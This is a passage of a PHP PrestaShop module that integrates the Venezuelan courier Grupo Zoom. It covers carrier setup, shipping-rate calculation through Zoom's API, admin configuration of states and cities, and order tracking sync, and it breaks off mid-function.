<?php
/**
* Modulo Zoom Courier for Venezuela
*
* @author    Kijam
* @copyright 2019 Kijam
* @license   Commercial use allowed (Non-assignable & non-transferable),
*            can modify source-code but cannot distribute modifications
*            (derivative works).
*/

if (!defined('_PS_VERSION_')) {
    exit;
}

class ZoomVE extends Module
{
    const ISO_COUNTRY = 've';
    const CURRENCY_COUNTRY = 'VES';

    const PRODUCTION_COST = 'https://api.zoom.red/canguroazul/';
    const SANDBOX_COST = 'https://sandbox.zoom.red/baaszoom/public/canguroazul/';

    public static $carrier_id;
    public static $config;
    public static $countries;
    public static $contribution_margin;
    public static $min_amount;
    public static $states;
    public static $status_ignore;

    protected static $module_cache;
    protected static $currency_convert;
    protected static $msg_error;
    protected static $dimensionUnit = '';
    protected static $weightUnit = '';
    protected $dimensionUnitList = array('CM' => 'CM', 'IN' => 'IN', 'CMS' => 'CM', 'INC' => 'IN');

    protected $weightUnitList = array('KG' => 'KGS', 'KGS' => 'KGS', 'LBS' => 'LBS', 'LB' => 'LBS');

    protected static $shipping_options = array(
        'nacional' => 'Zoom Puerta a Puerta',
        'ofi' => 'Zoom Retiro por Oficina',
        'nacional_cod' => 'Zoom Puerta a Puerta (COD)',
        'ofi_cod' => 'Zoom Retiro por Oficina (COD)',
        'internacional' => 'Zoom'
    );

    protected static $shipping_delay = array(
        'es' => array(
            'nacional' => '1-3 días hábiles',
            'ofi' => '1-3 días hábiles',
            'nacional_cod' => '1-3 días hábiles',
            'ofi_cod' => '1-3 días hábiles',
            'internacional' => '5-15 días hábiles'
        ),
        'en' => array(
            'nacional' => '1-3 business days',
            'ofi' => '1-3 business days',
            'nacional_cod' => '1-3 business days',
            'ofi_cod' => '1-3 business days',
            'internacional' => '5-15 business days'
        ),
    );

    public $id_carrier;
    public $context;
    public $base_file;

    public function __construct()
    {
        $this->name = 'zoomve';
        $this->tab = 'shipping_logistics';
        $this->version = '1.1.3';
        $this->author = 'Kijam';
        $this->module_key = '';
        $this->bootstrap = true;

        self::$msg_error = $this->l('You must enter a city and postal code');
        if (!is_array(self::$module_cache)) {
            self::$module_cache = array();
        }

        if (!class_exists('ZoomVEGateway')) {
            include_once(__DIR__.'/zoomve-gateway.php');
        }

        self::$currency_convert = (array)json_decode(Configuration::get('zoom_currency_convert'), true);
        $id_shop = Shop::getContextShopID();
        $id_shop_group = Shop::getContextShopGroupID();
        self::$carrier_id = (array)json_decode(
            Configuration::get('ZOOM_CARRIER_ID', null, $id_shop_group, $id_shop),
            true
        );
        self::$config = (array)json_decode(
            Configuration::get('ZOOM_CONFIG', null, $id_shop_group, $id_shop),
            true
        );
        self::$countries = (array)json_decode(
            Configuration::get('ZOOM_COUNTRIES', null, $id_shop_group, $id_shop),
            true
        );
        self::$contribution_margin = (array)json_decode(
            Configuration::get('ZOOM_CM', null, $id_shop_group, $id_shop),
            true
        );
        self::$min_amount = (array)json_decode(
            Configuration::get('ZOOM_MIN_AMOUNT', null, $id_shop_group, $id_shop),
            true
        );
        self::$states = (array)json_decode(
            Configuration::get('ZOOM_STATES', null, $id_shop_group, $id_shop),
            true
        );
        self::$status_ignore = (array)json_decode(
            Configuration::get('ZOOM_STATUS_IGNORE', null, $id_shop_group, $id_shop),
            true
        );

        $this->context = Context::getContext();// Checking Unit
        $du = Tools::strtoupper(Configuration::get('PS_DIMENSION_UNIT'));
        $wu = Tools::strtoupper(Configuration::get('PS_WEIGHT_UNIT'));
        if ($du == 'MT') {
            $du = 'CM';
        }
        self::$dimensionUnit = isset($this->dimensionUnitList[$du]) ? $this->dimensionUnitList[$du] : false;
        self::$weightUnit = isset($this->weightUnitList[$wu]) ? $this->weightUnitList[$wu] : false;
        if (!self::$weightUnit || !$this->weightUnitList[self::$weightUnit]) {
            $this->warning .= $this->l('\'Weight Unit is invalid (Only valid: LB or KG).\'');
        }
        if (!self::$dimensionUnit || !$this->dimensionUnitList[self::$dimensionUnit]) {
            $this->warning .= $this->l('\'Dimension Unit is invalid (Only valid: CM or IN).\'');
        }

        Module::__construct();

        if ($this->active) {
            $exists = array();
            $changes = false;
            if (isset(self::$carrier_id['ps_zoom']) &&
                is_array(self::$carrier_id['ps_zoom']) && count(self::$carrier_id['ps_zoom'])) {
                foreach (self::$carrier_id['ps_zoom'] as $id_carrier => $idx) {
                    $carrier = new Carrier($id_carrier);
                    if ($carrier && Validate::isLoadedObject($carrier) && !$carrier->deleted) {
                        $exists[] = $idx;
                    } else {
                        unset(self::$carrier_id['ps_zoom'][$id_carrier]);
                        unset(self::$carrier_id['zoom_ps'][$idx]);
                        $changes = true;
                    }
                }
            }
            if (!is_array(self::$carrier_id) || !isset(self::$carrier_id['ps_zoom'])) {
                self::$carrier_id = array();
                self::$carrier_id['zoom_ps'] = array();
                self::$carrier_id['ps_zoom'] = array();
            } else {
                if (!is_array(self::$carrier_id['ps_zoom'])) {
                    self::$carrier_id['ps_zoom'] = array();
                }
                if (!is_array(self::$carrier_id['zoom_ps'])) {
                    self::$carrier_id['zoom_ps'] = array();
                }
            }
            $id_country = Country::getByIso(self::ISO_COUNTRY);
            $id_zone = array();
            $id_zone[] = (int)Country::getIdZone($id_country);
            $zones = Zone::getZones();
            if ($zones) {
                foreach ($zones as $zone) {
                    if ((int)$zone['id_zone'] > 0 && !in_array((int)$zone['id_zone'], $id_zone)) {
                        $id_zone[] = (int)$zone['id_zone'];
                    }
                }
            }
            foreach (self::$shipping_options as $idx => $name) {
                if (in_array($idx, $exists)) {
                    continue;
                }
                $changes = true;
                $carrierConfig = array(
                    'name' => $name,
                    'id_module' => $this->id,
                    'url' => '',
                    'id_tax_rules_group' => 0,
                    'deleted' => 0,
                    'shipping_handling' => false,
                    'range_behavior' => 0,
                    'delay' => array(
                        'es' => self::$shipping_delay['es'][$idx],
                        'en' => self::$shipping_delay['en'][$idx]
                    ),
                    'id_zone' => $id_zone,
                    'is_module' => true,
                    'shipping_external' => true,
                    'external_module_name' => $this->name,
                    'need_range' => true,
                    'active' => true
                );
                $id_carrier = self::installExternalCarrier($carrierConfig);
                self::$carrier_id['zoom_ps'][$idx] = $id_carrier;
                self::$carrier_id['ps_zoom'][$id_carrier] = $idx;
            }
            if ($changes) {
                self::refreshCarrierList('ZOOM_CARRIER_ID', self::$carrier_id);
            }
        }

        $this->displayName = $this->l('Zoom');
        $this->description = $this->l('Grupo Zoom Venezuela');
        $this->base_file = __FILE__;
    }

    public function getDeliveryOptionList($cart, $default_country, $flush, $result)
    {
        $id_country = Country::getByIso(self::ISO_COUNTRY);
        $address = new Address($cart->id_address_delivery);
        $zip_code = false;
        /*
        if (Validate::isLoadedObject($address)) {
            $delivery = $address->postcode;
            if ($id_country == $address->id_country) {
                $city = trim($address->city);
                $city_zoom = self::getCache('zoom_city_'.$address->id);
            }
        }
        */
        if (!Validate::isLoadedObject($address) ||
            !is_array(self::$countries) ||
            !isset(self::$countries[$address->id_country]) ||
            !$this->active ||
            !ZoomVEGateway::setSettings($this)
            ) {
            self::log('Override cart: module not active or invalid address.');
            foreach ($result as $id_address => $carrier_list_raw) {
                foreach ($carrier_list_raw as $key => $carrier_list) {
                    foreach (array_keys($carrier_list['carrier_list']) as $id_carrier) {
                        $car = &$result[$id_address];
                        if (isset(self::$carrier_id['ps_zoom'][$id_carrier])) {
                            unset($car[$key]);
                        }
                    }
                }
            }
            return $result;
        }
        $products = $cart->getProducts();
        $dim = $this->calculatePackageSize($products);
        foreach ($result as $id_address => $carrier_list_raw) {
            foreach ($carrier_list_raw as $key => $carrier_list) {
                foreach (array_keys($carrier_list['carrier_list']) as $id_carrier) {
                    $car = &$result[$id_address];
                    if (isset(self::$carrier_id['ps_zoom'][$id_carrier])) {
                        $idx = self::$carrier_id['ps_zoom'][$id_carrier];
                        if ($idx == 'internacional') {
                            if ($id_country == $address->id_country) {
                                unset($car[$key]);
                                continue;
                            }
                            $zip_code = trim($address->postcode);
                            if (!is_array(self::$countries) ||
                                !isset(self::$countries[$address->id_country]) ||
                                (int)self::$countries[$address->id_country] < 1 ||
                                Tools::strlen($zip_code) < 1) {
                                unset($car[$key]);
                                continue;
                            }
                            $price = $this->checkShippingPrice(
                                $cart,
                                $zip_code,
                                0,
                                0,
                                $dim,
                                $idx,
                                $address->id_country
                            );
                            if (!$price || !$price['result']) {
                                unset($car[$key]);
                                continue;
                            }
                        } else {
                            if ($id_country != $address->id_country) {
                                unset($car[$key]);
                                continue;
                            }
                            if (!is_array(self::$states) ||
                                !isset(self::$states[$address->id_state]) ||
                                (int)self::$states[$address->id_state] < 1) {
                                unset($car[$key]);
                                continue;
                            }
                        }
                    }
                }
            }
        }
        return $result;
    }
    public function checkShippingPrice(
        $cart,
        $zip_code,
        $ofi_zoom,
        $city_zoom,
        $dim,
        $idx,
        $id_country
    ) {
        static $running  = false;
        if ($running || !isset($dim['items']) || count($dim['items']) == 0 || !ZoomVEGateway::setSettings($this)) {
            return array('result' => false, 'error_str' => 'Carrito Vacio', 'dim' => $dim, 'error' => self::$msg_error);
        }
        $is_cod = ($idx == 'nacional_cod' || $idx == 'ofi_cod');
        $is_ofi = ($idx == 'ofi' || $idx == 'ofi_cod');
        $tipo_tarifa = $is_cod?1:2;
        $ciudad_destinatartio = $city_zoom;
        $codpais = '';
        $tipo_envio = '';
        $oficina_destino = '';
        if ($is_ofi) {
            $oficina_destino = $ofi_zoom;
        }
        $args = array();
        switch ($idx) {
            case 'internacional':
                $tipo_tarifa = 3;
                $modalidad_tarifa = 0;
                $ciudad_destinatartio = 0;
                $zip_code = Tools::strtoupper(trim($zip_code));
                $codpais = self::$countries[$id_country];
                $tipo_envio = 'M';
                break;
            case 'ofi':
            case 'ofi_cod':
                $modalidad_tarifa = 1;
                //$oficina_retirar = $ofi_zoom;
                $zip_code = '';
                break;
            case 'nacional_cod':
            case 'nacional':
                $modalidad_tarifa = 2;
                $zip_code = '';
                break;
        }
        $currency = new Currency((int)$cart->id_currency);
        $rate = $this->getRate($currency->iso_code, self::CURRENCY_COUNTRY);
        $rateUSD = $this->getRate('USD', self::CURRENCY_COUNTRY);
        $args = array_merge($args, array(
            'tipo_tarifa' => $tipo_tarifa,
            'modalidad_tarifa' => $modalidad_tarifa,
            'ciudad_remitente' => self::$config['client_city'],
            'ciudad_origen' => self::$config['client_city'],
            'codciudad_origen' => self::$config['client_city'],
            'ciudad_destino'  => $ciudad_destinatartio,
			'ciudad_destinatario' => $ciudad_destinatartio,
            'codciudad_destino'  => $ciudad_destinatartio,
            'oficina_retirar'  => $oficina_destino,
            'proteccion'  => 1,
            'modalidad'  => $modalidad_tarifa,
        ));
        $total = 0.0;
        $dim['totals'] = array();
        $total_weight = 0;
        $total_weight_v = 0;
        $max_cost = (float)self::$config['max_cart_total'];
        foreach (array_keys($dim['items']) as $id_p) {
            $valor_declarado = Tools::ps_round($rate * $dim['total_wt'][$id_p], 2);
            if ($max_cost > 0 && $valor_declarado > $max_cost) {
                $valor_declarado = Tools::ps_round($max_cost, 2);
            }
			if ($valor_declarado < $rateUSD * 20) {
				$valor_declarado = $rateUSD * 20;
			}
            $result = array_merge($args, array(
                'cantidad_piezas' => $dim['items'][$id_p],
                'peso' => Tools::ps_round($dim['weight'][$id_p], 2),
                'valor_mercancia'  => 0,
                'valor_declarado'  => $valor_declarado,
                'codpais' => $codpais,
                'tipoenvio' => $tipo_envio,
                'zipcode' => $zip_code,
                'alto' => ceil($dim['height'][$id_p]),
                'ancho' => ceil($dim['width'][$id_p]),
                'largo' => ceil($dim['depth'][$id_p]),
            ));
            $c = ceil($dim['height'][$id_p]) * ceil($dim['width'][$id_p]) * ceil($dim['depth'][$id_p]);
            $total_weight_v += $c / 5000;
            $total_weight += $dim['weight'][$id_p];
            $cost = ZoomVEGateway::callApiCost('CalcularTarifa', $result);
            if ($cost && isset($cost['total'])) {
                $cost['total'] = str_replace('.', '', $cost['total']);
                $cost['total'] = str_replace(',', '.', $cost['total']);
                $total += $cost['total'];
                $dim['totals'][] = $cost;
            } else {
                $e = 'Ocurrio un error con uno de los productos, pongase en contacto con nosotros.';
                if ($cost && isset($cost['errormessage'])) {
                    return array(
                        'result' => false,
                        'error_str' => str_replace('es de  Kg(s)', 'fue excedido', $cost['errormessage']),
                        'dim' => $dim,
                        'error' => self::$msg_error
                    );
                } else {
                    return array(
                        'result' => false,
                        'error_str' => $e,
                        'dim' => $dim,
                        'error' => self::$msg_error
                    );
                }
            }
        }
        $rate = $this->getRate(self::CURRENCY_COUNTRY, $currency->iso_code);
        self::log('Pricio -> '.print_r($dim, true).': '.$total);
        $total = $total * $rate;
        self::log('Pricio Final -> : '.$total);
        $total_display = Tools::displayPrice($total, $currency);
        return array(
            'result' => array(
                'total' => $total,
                'total_display' => $total_display,
                'rate' => $rate
            ),
            'dim' => $dim,
            'error_str' => false,
            'error' => false
        );
    }
    public function getOrderShippingCost($params, $shipping_cost)
    {
        $idx = self::$carrier_id['ps_zoom'][$this->id_carrier];
        $id_country = Country::getByIso(self::ISO_COUNTRY);
        $address = new Address($params->id_address_delivery);
        $delivery = false;
        $city = false;
        if (!Validate::isLoadedObject($address) || !ZoomVEGateway::setSettings($this)) {
            return false;
        } else {
            $delivery = trim($address->postcode);
            if (empty($delivery) && $id_country != $address->id_country) {
                return false;
            }
            if ($idx != 'internacional' && $id_country != $address->id_country) {
                return false;
            }
            if ($idx == 'internacional' && $id_country == $address->id_country) {
                return false;
            }
        }
        $city = ZoomVE::getCache('zoom_city_'.$address->id);
        $ofi = ZoomVE::getCache('zoom_ofi_'.$address->id);
        $products = $params->getProducts();
        //die(print_r($products, true));
        $dim = $this->calculatePackageSize($products);
        //die(print_r($dim, true));
        if ($idx == 'ofi' && !$ofi && $city) {
            $o = ZoomVEGateway::callApiCost('getSucursales', array(
                'codciudad' => $city,
            ));
            if ($o && !isset($o['errormessage'])) {
                $ofi = $o[0]['codoficina'];
                ZoomVE::setCache('zoom_ofi_'.$address->id, $ofi);
            } else {
                $city = false;
            }
        } elseif ($idx == 'ofi' && $ofi && $city) {
            $o = ZoomVEGateway::callApiCost('getSucursales', array(
                'codciudad' => $city,
            ));
            if ($o && !isset($o['errormessage']) && !isset($o[$ofi])) {
                $ofi = $o[0]['codoficina'];
                ZoomVE::setCache('zoom_ofi_'.$address->id, $ofi);
            } else {
                $city = false;
            }
        }
        if ($idx != 'internacional' && !$city) {
            $cities = ZoomVEGateway::callApiCost('getCiudadesOfi', array('codestado' => self::$states[$address->id_state]));
            foreach ($cities as $zoom_c) {
                $o = ZoomVEGateway::callApiCost('getSucursales', array(
                    'codciudad' => $zoom_c['codciudad'],
                ));
                if ($o && !isset($o['errormessage'])) {
                    $ofi = $o[0]['codoficina'];
                    $city = $zoom_c['codciudad'];
                    //ZoomVE::setCache('zoom_ofi_'.$address->id, $ofi, 3600*24*180);
                    //ZoomVE::setCache('zoom_city_'.$address->id, $zoom_c['codciudad'], 3600*24*180);
                    break;
                }
            }
        }
        $result = $this->checkShippingPrice(
            $params,
            $delivery,
            $ofi,
            $city,
            $dim,
            $idx,
            $address->id_country
        );
        if ($result['result'] && isset($result['result']['total'])) {
            if (!$shipping_cost || $idx == 'nacional_cod' || $idx == 'ofi_cod') {
                return 0;
            }
            return Tools::ps_round(
                $result['result']['total'],
                2
            );
        }
        //echo $idx.' '.$ofi.' '.$city.' ';
        //die (var_export($result, true));
        return false;
    }
    /**
    * Add the CSS & JavaScript files you want to be loaded in the FO.
    */
    public function hookDisplayHeader()
    {
        $this->getRate('USD', 'VEF'); //Forzar actualizar las tasas actuales...
        $this->trackingNumber();
        $this->context->controller->addJS($this->_path.'/views/js/front.js');
        $this->context->controller->addCSS($this->_path.'/views/css/front.css');
        return '<script>var zoom_url_ajax = "'.$this->context->link->getModuleLink($this->name, 'redirect', array(
            'ajax'      => 1,
            'cmd'  => '_CMD_',
            'args' => '_ARGS_'
        ), true).'";</script>';
    }

    /**
    * Add the CSS & JavaScript files you want to be loaded in the BO.
    */
    public function hookDisplayBackOfficeHeader()
    {
        $this->context->controller->addJS($this->_path.'views/js/back.js');
        $this->context->controller->addCSS($this->_path.'views/css/back.css');
    }
    public function hookDisplayAdminOrder($params)
    {
        $id_order = (int) $params['id_order'];
        $order = new Order($id_order);
        $carrier = new Carrier((int)$order->id_carrier, $order->id_lang);
        if (!Validate::isLoadedObject($carrier) || !isset(self::$carrier_id['ps_zoom'][$carrier->id])) {
            return;
        }
        $idx = self::$carrier_id['ps_zoom'][$carrier->id];
        $address = new Address($order->id_address_delivery);
        $city_zoom = self::getCache('zoom_city_'. $order->id_address_delivery);
        $ofi_zoom = self::getCache('zoom_ofi_'. $order->id_address_delivery);
        if ( $city_zoom ) {
            $cities = ZoomVEGateway::callApiCost('getCiudadesOfi', array('codestado' => self::$states[$address->id_state]));
            $offices = ZoomVEGateway::callApiCost('getSucursales', array(
                'codciudad' => $city_zoom,
            ));
            $orders = Db::getInstance()->ExecuteS('
                                SELECT * FROM `'._DB_PREFIX_.'zoomve_report`
                                    WHERE
                                        id_order = '.(int)$id_order);
            if ($idx == 'ofi' || $idx == 'ofi_cod') {
                if ($offices) {
                    foreach($offices as $ofi) {
                        if ($ofi['codoficina'] == $ofi_zoom) {
                            $ofi_zoom = $ofi;
                            break;
                        }
                    }
                }
            }
            if ($cities) {
                foreach($cities as $city) {
                    if ($city['codciudad'] == $city_zoom) {
                        $city_zoom = $city;
                        break;
                    }
                }
            }
            $this->context->smarty->assign(array(
                'city_zoom' => $city_zoom,
                'ofi_zoom' => $ofi_zoom,
                'order' => $order,
                'status_zoom' => $orders[0] ?? null
            ));
            return $this->display(__FILE__, 'views/templates/admin/order.tpl');
        }
	}
    public function hookDisplayCarrierExtraContent($params)
    {
        $id_carrier = $params['carrier']['id'];
        $idx = self::$carrier_id['ps_zoom'][$id_carrier];
        $id_country = Country::getByIso(self::ISO_COUNTRY);
        $address = new Address($params['cart']->id_address_delivery);
        $city_zoom = false;
        $html = '<div class="div_parent_zoom delivery_option_'.$id_carrier.'">';
        if ($id_country == $address->id_country) {
            $state_zoom = self::$states[$address->id_state];
            $city_zoom = self::getCache('zoom_city_'.$address->id);
            $ofi_zoom = self::getCache('zoom_ofi_'.$address->id);
            $html .= $this->l('Zoom City').':
                <div data-idx="'.$idx.'"
                     data-carrier="'.$id_carrier.'"
                     data-state="'.$state_zoom.'"
                     data-city="'.$city_zoom.'"
                     data-ofi="'.$ofi_zoom.'"
                     data-origin="'.self::$config['client_city'].'"
                     data-cod="'.($idx == 'nacional_cod' || $idx == 'ofi_cod'?1:0).'"
                     class="list_zoom_city"></div><br /><br />';
            if ($idx == 'ofi' || $idx == 'ofi_cod') {
                $html .= $this->l('Zoom Office').':
                    <div data-idx="'.$idx.'"
                         data-state="'.$state_zoom.'"
                         data-carrier="'.$id_carrier.'"
                         data-city="'.$city_zoom.'"
                         data-ofi="'.$ofi_zoom.'"
                         data-origin="'.self::$config['client_city'].'"
                         data-cod="'.($idx == 'ofi_cod'?1:0).'"
                         class="list_zoom_ofi"></div><br /><br />';
            }
            if ($idx == 'nacional_cod' || $idx == 'ofi_cod') {
                $html .= '<b>'.
                         $this->l('You must pay the shipping cost at the time of receiving the product.').' '.
                         $this->l('The approximate cost will be:').
                         '</b> <span class="zoom_cost"></span><br /><br />';
            }
        }
        return $html.'</div>';
    }
    public function hookActionCarrierUpdate($params)
    {
        $old_id_carrier = $params['id_carrier'];
        if (!isset(self::$carrier_id['ps_zoom'][$old_id_carrier])) {
            return;
        }
        $new_id_carrier = $params['carrier']->id;
        $idx = self::$carrier_id['ps_zoom'][$old_id_carrier];
        self::$carrier_id['zoom_ps'][$idx] = $new_id_carrier;
        self::$carrier_id['ps_zoom'][$new_id_carrier] = $idx;
        self::refreshCarrierList('ZOOM_CARRIER_ID', self::$carrier_id);
    }
    protected function preProcess()
    {
        if (Tools::isSubmit('config')) {
            self::$config = (array)Tools::getValue('config');
            self::$status_ignore = (array)Tools::getValue('status_ignore');
            self::$countries = (array)Tools::getValue('countries');
            self::$states = (array)Tools::getValue('states');

            $id_shop = Shop::getContextShopID();
            $id_shop_group = Shop::getContextShopGroupID();
            Configuration::updateValue(
                'ZOOM_CONFIG',
                (string)json_encode(self::$config),
                false,
                $id_shop_group,
                $id_shop
            );
            Configuration::updateValue(
                'ZOOM_STATUS_IGNORE',
                (string)json_encode(self::$status_ignore),
                false,
                $id_shop_group,
                $id_shop
            );
            Configuration::updateValue(
                'ZOOM_COUNTRIES',
                (string)json_encode(self::$countries),
                false,
                $id_shop_group,
                $id_shop
            );
            Configuration::updateValue(
                'ZOOM_STATES',
                (string)json_encode(self::$states),
                false,
                $id_shop_group,
                $id_shop
            );
            $this->getRate('USD', 'VEF', false); //Forzar actualizar las tasas actuales...
            //die ($rate);
            if (!ZoomVEGateway::getSettings()) {
                return '<ps-alert-error>
                    '.$this->l('Configuracion invalida. Valida tus datos y la licencia de Yipi.app').'
                </ps-alert-error>';
            }
            if (!isset(self::$config['client_city']) || empty(isset(self::$config['client_city']))) {
                    return '<ps-alert-error>
                        '.$this->l('Your city fields are required to calculate shipping price.').'
                    </ps-alert-error>';
            }
            return '<ps-alert-success>'.$this->l('Saved with success!').'</ps-alert-success>';
        }
        return '';
    }

    public function assignAdminParams()
    {

		if ($this->active && $this->id > 0)
            $this->checkHooks();
		
        $str = '';
        if (!isset(self::$config['client_city']) || empty(self::$config['client_city'])) {
            $str .= '<ps-alert-warn>
                    '.$this->l('Your city fields are required to calculate shipping price.').'
                </ps-alert-warn>';
        }
        $raw = ZoomVEGateway::callApiCost('getEstados');
        $zoom_states = array();
        foreach ($raw as $d) {
            $zoom_states[] = array('id' => $d['codestado'], 'name' => $d['nombre']);
        }
        $raw = ZoomVEGateway::callApiCost('getCiudades', array('filtro' => 'nacional'));
        $zoom_cities = array();
        foreach ($raw as $d) {
            $zoom_cities[] = array('id' => $d['codciudad'], 'name' => $d['nombre_ciudad']);
        }
        $raw = ZoomVEGateway::callApiCost('getPaises', array('tipo' => 0));
        $zoom_countries = array();
        foreach ($raw as $d) {
            $zoom_countries[] = array('id' => $d['codpais'], 'name' => $d['nombre_pais']);
        }
        $url_ajax = $this->context->link->getModuleLink($this->name, 'redirect', array(
            'ajax'      => 1,
            'cmd'  => '_CMD_',
            'args' => '_ARGS_'
        ), true);
        $id_country = Country::getByIso(self::ISO_COUNTRY);
        $ps_countries = Country::getCountries($this->context->language->id, true);
        $ps_states = State::getStatesByIdCountry($id_country);
        $country = new Country($id_country);
        if (!$country->contains_states) {
            $country->contains_states = true;
            $country->save();
        }
        $format_address = AddressFormat::getAddressCountryFormat($id_country);
        if (strpos($format_address, 'State:name') === false) {
            $format = new AddressFormat($id_country);
            $format->format = preg_replace('/city/s', 'city, State:name', $format->format);
            $format->save();
        }
        if (!$ps_states || count($ps_states) == 0) {
            self::$states = array();
            foreach ($zoom_states as $state) {
                $s = new State();
                $s->id_country = $id_country;
                $s->iso_code = 'zoom-'.$state['id'];
                $s->name = $state['name'];
                $s->id_zone = $country->id_zone;
                $s->save();
                self::$states[$s->id] = $state['id'];
            }
            $id_shop = Shop::getContextShopID();
            $id_shop_group = Shop::getContextShopGroupID();
            Configuration::updateValue(
                'ZOOM_STATES',
                (string)json_encode(self::$states),
                false,
                $id_shop_group,
                $id_shop
            );
            $ps_states = State::getStatesByIdCountry($id_country);
        }
        if (is_array(self::$states) && count(self::$states)) {
            foreach (array_keys(self::$states) as $k) {
                if ((int)$k < 1) {
                    unset(self::$states[$k]);
                }
            }
        }
        if (!is_array(self::$states) || count(self::$states) < 1) {
            if (!is_array(self::$states)) {
                self::$states = array();
            }
            foreach ($ps_states as $state) {
                $name = Tools::strtoupper($state['name']);
                foreach ($zoom_states as $zstate) {
                    if ($name == $zstate['name']) {
                        self::$states[$state['id_state']] = $zstate['id'];
                    }
                }
            }
            $id_shop = Shop::getContextShopID();
            $id_shop_group = Shop::getContextShopGroupID();
            Configuration::updateValue(
                'ZOOM_STATES',
                (string)json_encode(self::$states),
                false,
                $id_shop_group,
                $id_shop
            );
        }

        $order_states = OrderState::getOrderStates(Context::getContext()->employee->id_lang);
        $this->smarty->assign('display_name', $this->displayName);
        $this->smarty->assign('order_states', $order_states);
        $this->smarty->assign('status_ignore', self::$status_ignore);
        $this->smarty->assign('config', self::$config);
        $this->smarty->assign('config_states', self::$states);
        $this->smarty->assign('config_countries', self::$countries);
        $this->smarty->assign('zoom_states', $zoom_states);
        $this->smarty->assign('zoom_countries', $zoom_countries);
        $this->smarty->assign('zoom_cities', $zoom_cities);
        $this->smarty->assign('url_ajax', $url_ajax);
        $this->smarty->assign('countries', $ps_countries);
        $this->smarty->assign('states', $ps_states);

        return $str;
    }

    private function trackingNumber()
    {
        if (!$this->active) {
            return;
        }
        $id_shop = Shop::getContextShopID();
        $new_orders = Db::getInstance()->ExecuteS('
                    SELECT oc.*
                    FROM `'._DB_PREFIX_.'order_carrier` oc
                        INNER JOIN `'._DB_PREFIX_.'orders` o ON
                            oc.id_order = o.id_order AND
                            o.id_shop = '.(int)$id_shop.'
                        LEFT JOIN `'._DB_PREFIX_.'zoomve_report` zoom ON
                            zoom.id_order = o.id_order AND
                            zoom.id_order_carrier = oc.id_order_carrier
                    WHERE
                            zoom.id IS NULL
                        AND
                            oc.tracking_number IS NOT NULL
                        AND
                            oc.tracking_number <> \'\'
                        AND
                            oc.date_add > \''.date('Y-m-d H:i:s', strtotime('-60 day')).'\'');

        if ($new_orders && count($new_orders) > 0) {
            self::log("New Orders: ".print_r($new_orders, true));
            foreach ($new_orders as &$row) {
                $order = new Order((int)$row['id_order']);
                if (Validate::isLoadedObject($order)) {
                    Db::getInstance()->Execute('
                        INSERT INTO `'._DB_PREFIX_.'zoomve_report`
                            (`id_shop`, `id_order`, `id_order_carrier`, `first_sync`)
                        VALUES
                            (
                                '.(int)$id_shop.',
                                '.(int)$row['id_order'].',
                                '.(int)$row['id_order_carrier'].',
                                NOW()
                            )');
                }
            }
        } else {
            self::log("New Orders: empty");
        }
        $orders = Db::getInstance()->ExecuteS('
                            SELECT * FROM `'._DB_PREFIX_.'zoomve_report`
                                WHERE
                                    last_sync < \''.date('Y-m-d H:i:s', time() - 3 * 60 * 60).'\'
                                AND
                                    first_sync > \''.date('Y-m-d H:i:s', time() - 60 * 24 * 60 * 60).'\'
                                AND
                                    (last_status IS NULL OR 
                                        (last_status <> \'DELIVERED\' AND
                                         last_status <> \'IGNORE\'))
                                AND
                                    id_shop = '.(int)$id_shop.'
                                ORDER BY id_order DESC LIMIT 2');

        self::log("Checks Orders: ".print_r($orders, true));
        foreach ($orders as &$row) {
            $order_carrier = new OrderCarrier((int)$row['id_order_carrier']);
            if (!Validate::isLoadedObject($order_carrier)) {
                self::log("OrderCarrier no valid: ".$row['id_order_carrier']);
                continue;
            }

            $order = new Order((int)$order_carrier->id_order);
            if (!Validate::isLoadedObject($order)) {
                self::log("Order no valid: ".$row['id_order_carrier']);
                continue;
            }

            $current_state = (int)$order->getCurrentState();
            if ($current_state == (int)Configuration::get('PS_OS_CANCELED') ||
                $current_state == (int)Configuration::get('PS_OS_REFUND')) {
                self::log("PS_OS_CANCELED or PS_OS_REFUND ".(int)$order_carrier->id_order);
                Db::getInstance()->Execute('
                    UPDATE `'._DB_PREFIX_.'zoomve_report` SET
                        `last_status` = \'IGNORE\',
                        `last_status_detail` = \'Order Canceled...\',
                        `last_sync` = NOW()
                        WHERE
                                id_order = '.(int)$order_carrier->id_order.'
                            AND
                                id_order_carrier = '.(int)$order_carrier->id_order_carrier);
                continue;
            }

            if (self::$config['status_delivery'] == $current_state) {
                self::log("usps_status_delivery ".(int)$order_carrier->id_order);
                Db::getInstance()->Execute('
                    UPDATE `'._DB_PREFIX_.'zoomve_report` SET
                        `last_status` = \'DELIVERED\',
                        `last_status_detail` = \'Auto-detect delivery...\',
                        `last_sync` = NOW()
                        WHERE
                                id_order = '.(int)$order_carrier->id_order.'
                            AND
                                id_order_carrier = '.(int)$order_carrier->id_order_carrier);
                self::log("Auto-detect delivery ".(int)$order_carrier->id_order);
                continue;
            }

            $carrier = new Carrier((int)$order->id_carrier, $order->id_lang);
            if (!Validate::isLoadedObject($carrier) || !isset(self::$carrier_id['ps_zoom'][$carrier->id])) {
                self::log("Carrier not supported ".(int)$order_carrier->id_order);
                Db::getInstance()->Execute('
                    UPDATE `'._DB_PREFIX_.'zoomve_report` SET
                        `last_status` = \'IGNORE\',
                        `last_status_detail` = \'Carrier not supported...\',
                        `last_sync` = NOW()
                        WHERE
                                id_order = '.(int)$order_carrier->id_order.'
                            AND
                                id_order_carrier = '.(int)$order_carrier->id_order_carrier);
                continue;
            }

            if (in_array($current_state, self::$status_ignore)) {
                self::log("Status ignore ".(int)$order_carrier->id_order);
                continue;
            }

            self::log("addPackage: ".$order_carrier->tracking_number);

            $track = ZoomVEGateway::callApiTrack('getZoomTrackWs', array(
                'tipo_busqueda' => 3,
                'codigo' => $order_carrier->tracking_number));
            self::log("result1: ".print_r($track, true));//exit;
            if (!isset($track['mensaje']) || $track['mensaje'] != 'CONSULTA REALIZADA EXITOSAMENTE') {
                $track = ZoomVEGateway::callApiTrack('getZoomTrackWs', array(
                    'tipo_busqueda' => 1,
                    'codigo' => $order_carrier->tracking_number));
                self::log("result2: ".print_r($track, true));//exit;
            }
            if (isset($track['entidadRespuesta']) && isset($track['entidadRespuesta']['tracking'])) {
                $dhl = $track['entidadRespuesta']['infoDhl'];
                $is_dhl = true;
                if (!is_array($dhl) || !isset($dhl['guiaDhl']) || empty($dhl['guiaDhl'])) {
                    $is_dhl = false;
                }
                $track = $track['entidadRespuesta']['tracking'][0];
                $message_txt = false;
                $track['observacion'] = html_entity_decode($track['observacion'], ENT_QUOTES, "utf-8");
                $new_status = null;
